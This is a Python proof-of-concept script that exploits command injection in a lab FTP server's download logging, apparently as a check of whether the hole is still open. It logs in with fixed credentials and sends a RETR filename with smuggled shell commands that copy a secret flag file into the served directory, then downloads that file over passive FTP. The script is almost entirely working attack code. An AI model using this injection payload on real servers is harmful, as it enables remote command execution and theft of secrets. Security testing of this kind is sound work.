#!/usr/bin/env python3
"""
PoC #1: Command injection via RETR filename
--------------------------------------------
log_download() builds a shell command by concatenating the raw RETR
filename argument and passes it to system(), unescaped. A filename
containing shell metacharacters runs arbitrary commands.

Verification is purely over the network: the injected command reads the
server's real runtime secret (secret/flag.txt, written outside ftproot at
startup from FMM_FLAG - see write_flag_files() in fmm.cpp) and copies it
*inside ftproot*, where this script then RETRs it back over FTP and checks
it matches this deployment's FMM_FLAG. No local filesystem access to the
server's host/container is used - system() is the exploited path, not a
side channel.

Run the server first: ./fmm
Then:  python3 01_command_injection.py [host] [port]
"""
import os
import socket
import sys
import uuid

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 2121

# Same fallback fmm.cpp uses when FMM_FLAG is unset (see DEFAULT_FLAG in
# fmm.cpp), so a plain local run against a standalone `./fmm`/`docker run`
# still has something correct to assert against.
EXPECTED_FLAG = os.environ.get("FMM_FLAG") or "FLAG{local-dev-default}"


def connect():
    s = socket.create_connection((HOST, PORT), timeout=5)
    s.recv(4096)
    return s


def cmd(s, line):
    s.sendall((line + "\n").encode())
    return s.recv(4096).decode(errors="replace")


def drain(sock, timeout=1.0):
    sock.settimeout(timeout)
    chunks = b""
    try:
        while True:
            d = sock.recv(65536)
            if not d:
                break
            chunks += d
    except socket.timeout:
        pass
    return chunks.decode(errors="replace")


def open_pasv(s):
    """Send PASV, parse the 227 reply, and return a connected data socket."""
    reply = cmd(s, "PASV")
    nums = reply[reply.index("(") + 1:reply.index(")")].split(",")
    port = int(nums[4]) * 256 + int(nums[5])
    return socket.create_connection((".".join(nums[:4]), port), timeout=5)


def main():
    s = connect()
    print(cmd(s, "USER alice"))
    print(cmd(s, "PASS password123"))

    leak_name = f"leaked_{uuid.uuid4().hex[:8]}.txt"

    # Break out of the echo "..." string the server builds server-side and
    # copy the real secret file (outside ftproot) into ftproot, so it can be
    # read back over FTP instead of checked on the local disk.
    payload = f'RETR whatever"; cat secret/flag.txt > ftproot/{leak_name}; echo "'
    print(cmd(s, payload))

    # system() is synchronous, so by the time the RETR response above
    # arrived the injected command has already run - fetch the leaked file
    # purely over the FTP protocol. RETR bodies now travel over a data
    # connection, so open one with PASV first and read the file off it.
    data = open_pasv(s)
    first = cmd(s, f"RETR {leak_name}")
    print(first.strip())
    resp = drain(data)
    print(resp)

    if EXPECTED_FLAG in resp:
        print(f"[+] Command injection confirmed - retrieved '{EXPECTED_FLAG}' "
              f"(this deployment's FMM_FLAG) over FTP via system()")
        s.close()
        sys.exit(0)   # exploited -> vuln OPEN
    print("[-] Did not retrieve this run's flag over FTP - injection may not have fired")
    s.close()
    sys.exit(1)       # blocked -> vuln FIXED


if __name__ == "__main__":
    main()